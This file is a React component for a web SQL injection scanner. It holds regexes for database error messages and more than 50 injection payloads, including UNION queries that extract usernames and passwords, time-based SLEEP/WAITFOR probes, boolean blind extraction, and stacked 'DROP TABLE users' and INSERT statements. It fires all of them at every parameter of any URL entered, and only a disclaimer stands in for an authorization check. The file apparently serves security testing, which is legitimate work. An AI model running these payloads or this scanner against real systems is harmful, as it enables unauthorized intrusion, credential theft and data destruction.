import { useState } from "react";
import { motion } from "framer-motion";
import {
  ArrowLeft,
  Search,
  Loader2,
  Globe,
  CheckCircle,
  XCircle,
  Copy,
  Check,
  AlertTriangle,
  Database,
  Shield,
  RefreshCw,
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";

import { proxyFetch } from "@/lib/proxyFetch";

// ─── SQL Error Patterns ──────────────────────────────────────────────────────

const DB_ERROR_PATTERNS: Array<{ pattern: RegExp; db: string }> = [
  // MySQL
  { pattern: /You have an error in your SQL syntax/i, db: "MySQL" },
  { pattern: /mysql_fetch/i, db: "MySQL" },
  { pattern: /Warning.*mysql_/i, db: "MySQL" },
  { pattern: /MySQLSyntaxErrorException/i, db: "MySQL" },
  { pattern: /valid MySQL result/i, db: "MySQL" },
  { pattern: /MySqlClient\./i, db: "MySQL" },
  { pattern: /com\.mysql\.jdbc/i, db: "MySQL" },
  { pattern: /Unclosed quotation mark after the character string/i, db: "MySQL" },
  // PostgreSQL
  { pattern: /PostgreSQL.*ERROR/i, db: "PostgreSQL" },
  { pattern: /WARNING.*Pg/i, db: "PostgreSQL" },
  { pattern: /pg_query\(\)/i, db: "PostgreSQL" },
  { pattern: /PSQLException/i, db: "PostgreSQL" },
  { pattern: /ERROR:\s+syntax error at/i, db: "PostgreSQL" },
  { pattern: /unterminated quoted string/i, db: "PostgreSQL" },
  // MSSQL
  { pattern: /Driver.*SQL[\s-]*Server/i, db: "MSSQL" },
  { pattern: /OLE DB.*SQL Server/i, db: "MSSQL" },
  { pattern: /\bODBC SQL Server Driver\b/i, db: "MSSQL" },
  { pattern: /SQLServer JDBC Driver/i, db: "MSSQL" },
  { pattern: /SqlClient/i, db: "MSSQL" },
  { pattern: /Unclosed quotation mark after the character string/i, db: "MSSQL" },
  { pattern: /Incorrect syntax near/i, db: "MSSQL" },
  { pattern: /Microsoft.*ODBC.*SQL Server/i, db: "MSSQL" },
  // Oracle
  { pattern: /ORA-\d{5}/i, db: "Oracle" },
  { pattern: /oracle\.jdbc/i, db: "Oracle" },
  { pattern: /Oracle error/i, db: "Oracle" },
  { pattern: /Oracle.*Driver/i, db: "Oracle" },
  { pattern: /quoted string not properly terminated/i, db: "Oracle" },
  // SQLite
  { pattern: /SQLite\/JDBCDriver/i, db: "SQLite" },
  { pattern: /SQLite\.Exception/i, db: "SQLite" },
  { pattern: /System\.Data\.SQLite\.SQLiteException/i, db: "SQLite" },
  { pattern: /Warning.*SQLite/i, db: "SQLite" },
  { pattern: /Warning.*sqlite_/i, db: "SQLite" },
  { pattern: /Warning.*SQLite3::/i, db: "SQLite" },
  { pattern: /SQLITE_ERROR/i, db: "SQLite" },
  { pattern: /unrecognized token:/i, db: "SQLite" },
  // Generic
  { pattern: /SQL syntax.*MySQL/i, db: "MySQL" },
  { pattern: /syntax error.*SQL/i, db: "Generic" },
  { pattern: /unexpected end of SQL command/i, db: "Generic" },
  { pattern: /Invalid column name/i, db: "MSSQL" },
  { pattern: /The used SELECT statements have a different number of columns/i, db: "MySQL" },
  { pattern: /supplied argument is not a valid/i, db: "Generic" },
  { pattern: /Division by zero in/i, db: "Generic" },
];

// ─── SQL Injection Payloads (60+) ────────────────────────────────────────────

const SQLI_PAYLOADS: Array<{ payload: string; label: string; category: string }> = [
  // Error-based
  { payload: "'", label: "Single Quote", category: "Error-Based" },
  { payload: "''", label: "Double Quote", category: "Error-Based" },
  { payload: "\\", label: "Backslash", category: "Error-Based" },
  { payload: "' OR '1'='1", label: "OR Tautology", category: "Error-Based" },
  { payload: "' OR 1=1--", label: "OR 1=1 Comment", category: "Error-Based" },
  { payload: "' OR 1=1#", label: "OR 1=1 Hash", category: "Error-Based" },
  { payload: "' OR 1=1/*", label: "OR 1=1 Block", category: "Error-Based" },
  { payload: "') OR ('1'='1", label: "OR Tautology Paren", category: "Error-Based" },
  { payload: "') OR 1=1--", label: "OR 1=1 Close-Paren", category: "Error-Based" },
  { payload: "1' OR '1'='1", label: "Numeric OR Tautology", category: "Error-Based" },
  { payload: "1' OR '1'='1'--", label: "Numeric Comment", category: "Error-Based" },
  { payload: "1' OR '1'='1'#", label: "Numeric Hash", category: "Error-Based" },
  // UNION-based
  { payload: "' UNION SELECT NULL--", label: "UNION NULL", category: "UNION-Based" },
  { payload: "' UNION SELECT NULL,NULL--", label: "UNION 2-NULL", category: "UNION-Based" },
  { payload: "' UNION SELECT NULL,NULL,NULL--", label: "UNION 3-NULL", category: "UNION-Based" },
  { payload: "' UNION SELECT NULL,NULL,NULL,NULL--", label: "UNION 4-NULL", category: "UNION-Based" },
  { payload: "' UNION SELECT NULL,NULL,NULL,NULL,NULL--", label: "UNION 5-NULL", category: "UNION-Based" },
  { payload: "1 UNION SELECT NULL--", label: "Num UNION NULL", category: "UNION-Based" },
  { payload: "0 UNION SELECT 1,2,3--", label: "UNION Numbers", category: "UNION-Based" },
  { payload: "' UNION ALL SELECT NULL--", label: "UNION ALL NULL", category: "UNION-Based" },
  { payload: "' UNION ALL SELECT NULL,NULL,NULL--", label: "UNION ALL 3-NULL", category: "UNION-Based" },
  { payload: "1 UNION SELECT 1,username,password FROM users--", label: "UNION Users", category: "UNION-Based" },
  // Time-based blind
  { payload: "' OR SLEEP(5)--", label: "MySQL SLEEP", category: "Time-Based" },
  { payload: "'; WAITFOR DELAY '0:0:5'--", label: "MSSQL WAITFOR", category: "Time-Based" },
  { payload: "' OR pg_sleep(5)--", label: "PostgreSQL pg_sleep", category: "Time-Based" },
  { payload: "1' OR SLEEP(5)#", label: "SLEEP Hash", category: "Time-Based" },
  { payload: "'; SELECT SLEEP(5);--", label: "SELECT SLEEP", category: "Time-Based" },
  { payload: "' OR BENCHMARK(10000000,SHA1('test'))--", label: "MySQL BENCHMARK", category: "Time-Based" },
  { payload: "1'; WAITFOR DELAY '0:0:5'--", label: "Num WAITFOR", category: "Time-Based" },
  { payload: "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--", label: "Subquery SLEEP", category: "Time-Based" },
  // Boolean-based blind
  { payload: "' AND 1=1--", label: "AND True", category: "Boolean-Based" },
  { payload: "' AND 1=2--", label: "AND False", category: "Boolean-Based" },
  { payload: "1' AND '1'='1", label: "Num AND True", category: "Boolean-Based" },
  { payload: "1' AND '1'='2", label: "Num AND False", category: "Boolean-Based" },
  { payload: "' AND SUBSTRING((SELECT database()),1,1)='a'--", label: "AND SUBSTRING", category: "Boolean-Based" },
  { payload: "' AND LENGTH(database())>0--", label: "AND LENGTH", category: "Boolean-Based" },
  { payload: "' AND ASCII(SUBSTRING((SELECT database()),1,1))>0--", label: "AND ASCII", category: "Boolean-Based" },
  // Stacked queries
  { payload: "'; DROP TABLE users--", label: "DROP TABLE", category: "Stacked" },
  { payload: "'; SELECT 1--", label: "Stacked SELECT", category: "Stacked" },
  { payload: "'; INSERT INTO users VALUES('a','b')--", label: "Stacked INSERT", category: "Stacked" },
  { payload: "1; SELECT 1--", label: "Num Stacked", category: "Stacked" },
  // Comment-based
  { payload: "' OR ''='", label: "OR Empty-Empty", category: "Comment" },
  { payload: "' OR 'x'='x", label: "OR X=X", category: "Comment" },
  { payload: "admin'--", label: "Admin Bypass", category: "Comment" },
  { payload: "admin'/*", label: "Admin Block Comment", category: "Comment" },
  { payload: "' OR 1=1 LIMIT 1--", label: "OR LIMIT 1", category: "Comment" },
  // Encoding bypasses
  { payload: "%27 OR %271%27%3D%271", label: "URL Encoded Quote", category: "Encoding" },
  { payload: "1%27%20OR%201%3D1--", label: "URL Encoded OR", category: "Encoding" },
  { payload: "0x27 OR 0x310x3D0x31", label: "Hex Encoded", category: "Encoding" },
  // Database-specific
  { payload: "' OR 1=1 LIMIT 1 OFFSET 1--", label: "LIMIT OFFSET", category: "Advanced" },
  { payload: "' GROUP BY columnnames HAVING 1=1--", label: "GROUP BY HAVING", category: "Advanced" },
  { payload: "extractvalue(1,concat(0x7e,(SELECT version())))", label: "extractvalue", category: "Advanced" },
  { payload: "updatexml(1,concat(0x7e,(SELECT version())),1)", label: "updatexml", category: "Advanced" },
  { payload: "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", label: "GROUP BY Error", category: "Advanced" },
  { payload: "1' AND EXP(~(SELECT * FROM (SELECT database())a))--", label: "EXP Overflow", category: "Advanced" },
  { payload: "' AND ROW(1,1)=(SELECT 1,2 FROM dual GROUP BY 1 HAVING 1=1)--", label: "ROW Error", category: "Advanced" },
];

// ─── Helpers ─────────────────────────────────────────────────────────────────

function isHtmlResponse(text: string): boolean {
  const t = text.toLowerCase().trim();
  return t.startsWith("<!doctype") || t.startsWith("<html");
}

function detectDbErrors(response: string): Array<{ db: string; match: string }> {
  const found: Array<{ db: string; match: string }> = [];
  const seen = new Set<string>();
  for (const { pattern, db } of DB_ERROR_PATTERNS) {
    const match = response.match(pattern);
    if (match && !seen.has(db)) {
      seen.add(db);
      const snippet = response.substring(
        Math.max(0, match.index! - 20),
        Math.min(response.length, match.index! + match[0].length + 40)
      );
      found.push({ db, match: snippet.replace(/</g, "&lt;").replace(/>/g, "&gt;") });
    }
  }
  return found;
}

function extractUrlParams(urlStr: string): string[] {
  try {
    const u = new URL(urlStr);
    return Array.from(u.searchParams.keys());
  } catch {
    return [];
  }
}

function extractFormParams(html: string): string[] {
  const names = new Set<string>();
  const regex = /(?:input|textarea|select)[^>]*\bname=["']([^"']+)["']/gi;
  let m;
  while ((m = regex.exec(html)) !== null) names.add(m[1]);
  const hidden = /type=["']hidden["'][^>]*\bname=["']([^"']+)["']/gi;
  while ((m = hidden.exec(html)) !== null) names.add(m[1]);
  return Array.from(names);
}

async function safeFetch(url: string, timeoutMs = 15000): Promise<string> {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);
  try {
    const res = await proxyFetch(url, { signal: controller.signal });
    clearTimeout(timer);
    if (!res.ok && res.headers.get("x-proxy-error")) throw new Error(`HTTP ${res.status}`);
    const text = await res.text();
    if (isHtmlResponse(text)) return text;
    // Also accept JSON/text responses (API endpoints)
    return text;
  } catch (err) {
    clearTimeout(timer);
    throw err;
  }
}

// ─── Types ───────────────────────────────────────────────────────────────────

interface SqliFinding {
  parameter: string;
  payload: string;
  label: string;
  category: string;
  dbErrors: Array<{ db: string; match: string }>;
}

// ─── UI Components ───────────────────────────────────────────────────────────

function CopyButton({ text }: { text: string }) {
  const [copied, setCopied] = useState(false);
  const handleCopy = () => {
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };
  return (
    <button onClick={handleCopy} className="text-xs text-muted-foreground hover:text-cyan transition-colors">
      {copied ? <Check className="size-3 text-emerald" /> : <Copy className="size-3" />}
    </button>
  );
}

// ─── Main Component ──────────────────────────────────────────────────────────

interface SqlInjectionScannerProps {
  onBack: () => void;
}

export function SqlInjectionScanner({ onBack }: SqlInjectionScannerProps) {
  const [url, setUrl] = useState("");
  const [scanning, setScanning] = useState(false);
  const [findings, setFindings] = useState<SqliFinding[]>([]);
  const [paramsFound, setParamsFound] = useState<string[]>([]);
  const [error, setError] = useState<string | null>(null);
  const [scanTime, setScanTime] = useState<number | null>(null);
  const [progress, setProgress] = useState({ current: 0, total: 0 });
  const [scannedParams, setScannedParams] = useState(0);
  const [categoryFilter, setCategoryFilter] = useState<string>("all");

  const cleanUrl = (input: string) => {
    let u = input.trim();
    if (!u.startsWith("http")) u = `https://${u}`;
    return u;
  };

  const categories = ["all", ...new Set(SQLI_PAYLOADS.map((p) => p.category))];

  const handleScan = async () => {
    if (!url.trim()) return;
    const target = cleanUrl(url);
    setUrl(target);
    setScanning(true);
    setFindings([]);
    setParamsFound([]);
    setError(null);
    setScanTime(null);
    setScannedParams(0);
    const startTime = Date.now();

    try {
      const html = await safeFetch(target);
      const urlParams = extractUrlParams(target);
      const formParams = extractFormParams(html);
      const allParams = [...new Set([...urlParams, ...formParams])];

      if (allParams.length === 0) {
        setError("No input parameters found. Add query parameters (e.g., ?id=1) or the page must contain HTML forms.");
        setScanTime(Date.now() - startTime);
        setScanning(false);
        return;
      }

      setParamsFound(allParams);
      setProgress({ current: 0, total: allParams.length * SQLI_PAYLOADS.length });

      const allFindings: SqliFinding[] = [];

      for (let pi = 0; pi < allParams.length; pi++) {
        const param = allParams[pi];
        setScannedParams(pi + 1);

        for (let pai = 0; pai < SQLI_PAYLOADS.length; pai++) {
          const { payload, label, category } = SQLI_PAYLOADS[pai];
          setProgress({
            current: pi * SQLI_PAYLOADS.length + pai + 1,
            total: allParams.length * SQLI_PAYLOADS.length,
          });

          try {
            const testUrl = new URL(target);
            testUrl.searchParams.set(param, payload);
            const response = await safeFetch(testUrl.toString(), 10000);
            const dbErrors = detectDbErrors(response);

            if (dbErrors.length > 0) {
              allFindings.push({
                parameter: param,
                payload,
                label,
                category,
                dbErrors,
              });
            }
          } catch {
            // Skip silently
          }

          await new Promise((r) => setTimeout(r, 100));
        }
      }

      setFindings(allFindings);
      setScanTime(Date.now() - startTime);
    } catch (err) {
      setError(err instanceof Error ? err.message : "Failed to fetch target.");
    } finally {
      setScanning(false);
    }
  };

  const dbCounts = findings.reduce(
    (acc, f) => {
      for (const e of f.dbErrors) {
        acc[e.db] = (acc[e.db] || 0) + 1;
      }
      return acc;
    },
    {} as Record<string, number>
  );

  const filteredFindings =
    categoryFilter === "all"
      ? findings
      : findings.filter((f) => f.category === categoryFilter);

  return (
    <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.3 }} className="min-h-full">
      <div className="max-w-5xl mx-auto px-4 sm:px-6 py-8">
        <Button variant="ghost" size="sm" onClick={onBack} className="gap-2 mb-6 text-muted-foreground hover:text-foreground">
          <ArrowLeft className="size-4" /> Back to Dashboard
        </Button>

        <div className="flex flex-col sm:flex-row items-start gap-6 mb-8">
          <div className="flex size-16 items-center justify-center rounded-2xl shrink-0 bg-amber/10">
            <Database className="size-8 text-amber" />
          </div>
          <div className="flex-1 min-w-0">
            <h1 className="text-2xl sm:text-3xl font-bold tracking-tight mb-2">SQL Injection Scanner</h1>
            <p className="text-muted-foreground text-base">
              Injects {SQLI_PAYLOADS.length} SQL payloads into parameters and detects database error
              responses from MySQL, PostgreSQL, MSSQL, Oracle, and SQLite.
            </p>
          </div>
        </div>

        {/* Input */}
        <div className="glass-card rounded-2xl p-6 mb-6">
          <label className="text-sm font-medium mb-3 block">Target URL</label>
          <div className="flex gap-3">
            <div className="flex-1 relative">
              <Globe className="absolute left-3 top-1/2 -translate-y-1/2 size-4 text-muted-foreground" />
              <Input
                type="url"
                placeholder="https://example.com/page?id=1"
                value={url}
                onChange={(e) => setUrl(e.target.value)}
                onKeyDown={(e) => e.key === "Enter" && !scanning && handleScan()}
                className="pl-10"
                disabled={scanning}
              />
            </div>
            <Button onClick={handleScan} disabled={scanning || !url.trim()} className="gap-2 bg-amber hover:bg-amber/90 text-black font-semibold">
              {scanning ? <Loader2 className="size-4 animate-spin" /> : <Search className="size-4" />}
              {scanning ? "Scanning..." : "Scan SQLi"}
            </Button>
          </div>
          <p className="text-[11px] text-muted-foreground mt-2">
            {SQLI_PAYLOADS.length} payloads across {categories.length - 1} categories — Error-Based, UNION-Based,
            Time-Based, Boolean-Based, Stacked, Encoding, Advanced.
          </p>
        </div>

        {/* Progress */}
        {scanning && (
          <div className="glass-card rounded-xl p-4 mb-6">
            <div className="flex items-center justify-between mb-2">
              <span className="text-xs text-muted-foreground">
                Testing {scannedParams}/{paramsFound.length || "?"} params — {progress.current}/{progress.total} payloads
              </span>
            </div>
            <div className="w-full h-2 bg-muted rounded-full overflow-hidden">
              <motion.div
                className="h-full bg-amber rounded-full"
                animate={{ width: `${progress.total > 0 ? (progress.current / progress.total) * 100 : 0}%` }}
                transition={{ duration: 0.3 }}
              />
            </div>
          </div>
        )}

        {error && (
          <div className="glass-card rounded-xl p-4 border border-red/20 mb-6">
            <div className="flex items-start gap-3">
              <XCircle className="size-4 text-red shrink-0 mt-0.5" />
              <p className="text-sm text-muted-foreground">{error}</p>
            </div>
          </div>
        )}

        {/* Results */}
        {findings.length > 0 && (
          <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} className="space-y-4">
            {/* Summary */}
            <div className="flex flex-wrap items-center gap-4 text-xs text-muted-foreground">
              <span>Target: <code className="text-amber">{url}</code></span>
              {scanTime && <span>Scan time: {(scanTime / 1000).toFixed(1)}s</span>}
              <span>Parameters: {paramsFound.length}</span>
              <span className="text-amber font-medium">{findings.length} injection points</span>
            </div>

            {/* DB Breakdown */}
            <div className="flex gap-2 flex-wrap">
              {Object.entries(dbCounts).map(([db, count]) => (
                <Badge key={db} variant="outline" className="text-xs border-amber/30 text-amber">
                  {db}: {count}
                </Badge>
              ))}
            </div>

            {/* Category Filter */}
            <div className="flex items-center gap-2 flex-wrap">
              <span className="text-xs text-muted-foreground">Category:</span>
              {categories.map((cat) => (
                <button
                  key={cat}
                  onClick={() => setCategoryFilter(cat)}
                  className={`px-2.5 py-0.5 rounded-lg text-[11px] font-medium transition-colors ${
                    categoryFilter === cat
                      ? "bg-amber/10 text-amber border border-amber/30"
                      : "text-muted-foreground hover:text-foreground border border-border/50"
                  }`}
                >
                  {cat === "all" ? `All (${findings.length})` : cat}
                </button>
              ))}
            </div>

            {/* Findings Table */}
            <div className="glass-card rounded-2xl overflow-hidden">
              <div className="px-5 py-3 border-b border-border/50">
                <h3 className="text-sm font-semibold flex items-center gap-2">
                  <Shield className="size-4 text-amber" />
                  SQL Injection Findings
                </h3>
              </div>
              <div className="overflow-x-auto max-h-[600px] overflow-y-auto">
                <table className="w-full text-sm">
                  <thead className="sticky top-0 bg-card z-10">
                    <tr className="border-b border-border/50">
                      <th className="text-left px-5 py-2.5 text-xs font-medium text-muted-foreground uppercase">Param</th>
                      <th className="text-left px-5 py-2.5 text-xs font-medium text-muted-foreground uppercase">Payload</th>
                      <th className="text-left px-5 py-2.5 text-xs font-medium text-muted-foreground uppercase">Category</th>
                      <th className="text-left px-5 py-2.5 text-xs font-medium text-muted-foreground uppercase">DB Errors</th>
                      <th className="text-left px-5 py-2.5 text-xs font-medium text-muted-foreground uppercase">Copy</th>
                    </tr>
                  </thead>
                  <tbody>
                    {filteredFindings.map((f, i) => (
                      <tr key={`${f.parameter}-${f.payload}-${i}`} className="border-b border-border/30 last:border-0 hover:bg-muted/30 transition-colors">
                        <td className="px-5 py-2.5">
                          <code className="text-cyan font-mono text-xs">{f.parameter}</code>
                        </td>
                        <td className="px-5 py-2.5">
                          <code className="text-xs font-mono text-muted-foreground break-all">{f.payload.substring(0, 50)}{f.payload.length > 50 ? "..." : ""}</code>
                          <span className="text-[10px] text-muted-foreground ml-2">{f.label}</span>
                        </td>
                        <td className="px-5 py-2.5">
                          <Badge variant="outline" className="text-[10px]">{f.category}</Badge>
                        </td>
                        <td className="px-5 py-2.5">
                          <div className="flex gap-1 flex-wrap">
                            {f.dbErrors.map((e, j) => (
                              <Badge key={j} variant="outline" className="text-[9px] border-red/30 text-red">
                                {e.db}
                              </Badge>
                            ))}
                          </div>
                        </td>
                        <td className="px-5 py-2.5">
                          <CopyButton text={`${f.parameter}: ${f.payload}`} />
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>
          </motion.div>
        )}

        {!scanning && findings.length === 0 && paramsFound.length > 0 && !error && (
          <div className="glass-card rounded-2xl p-8 text-center border border-emerald/20">
            <CheckCircle className="size-10 text-emerald mx-auto mb-3" />
            <p className="text-sm font-medium text-emerald mb-1">No SQL injection vulnerabilities detected</p>
            <p className="text-xs text-muted-foreground">
              Tested {paramsFound.length} params with {SQLI_PAYLOADS.length} payloads. The target may use parameterized queries or WAF protection.
            </p>
          </div>
        )}

        <div className="glass-card rounded-xl p-4 border border-amber/20 mt-6">
          <div className="flex items-start gap-3">
            <AlertTriangle className="size-4 text-amber shrink-0 mt-0.5" />
            <div className="text-xs text-muted-foreground">
              <p>
                <strong className="text-foreground">How it works:</strong> Injects SQL payloads
                into each parameter and checks the response for 30+ known database error
                patterns across MySQL, PostgreSQL, MSSQL, Oracle, and SQLite. Error-based
                detection is the most reliable method for identifying injection points.
              </p>
              <p className="mt-1 text-amber">
                <strong>Educational use only.</strong> Only scan targets you own or have
                authorization to test.
              </p>
            </div>
          </div>
        </div>
      </div>
    </motion.div>
  );
}
